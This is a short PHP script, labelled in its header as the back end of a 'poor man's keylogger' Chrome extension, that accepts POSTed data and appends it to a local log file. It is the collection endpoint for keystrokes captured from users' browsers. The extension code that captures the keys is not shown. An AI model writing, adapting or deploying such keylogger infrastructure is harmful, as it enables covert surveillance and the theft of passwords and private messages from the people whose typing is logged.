<?php
/**
 * Poor man's keylogger 
 * A chrome extension 
 * Weldan Jamili <mweldan@gmail.com> 2013
 * http://mweldan.com
 */

// log file name 
$logfile = "./logs.txt";

if (!empty($_POST['data'])) {
    file_put_contents($logfile, $_POST['data']."\n", FILE_APPEND);
    echo 1;
    exit;
}
echo 0;
exit;
?>
